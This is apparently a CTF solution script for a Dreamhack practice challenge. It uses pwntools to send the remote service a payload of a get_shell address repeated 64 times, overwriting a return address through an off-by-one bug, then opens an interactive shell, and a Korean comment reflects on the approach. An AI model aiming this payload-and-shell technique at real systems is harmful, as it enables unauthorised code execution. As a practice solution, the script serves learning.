#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 17382)

target = 0x080485db

payload = pwn.p32(target)*64

p.send(payload)
p.interactive()

"""
Off_by_one 기법에 대한 이해는 했지만 그냥 무식하게 get_shell 주소로 반복해서 덮어버리는 방법은 생각도 못했다..
"""
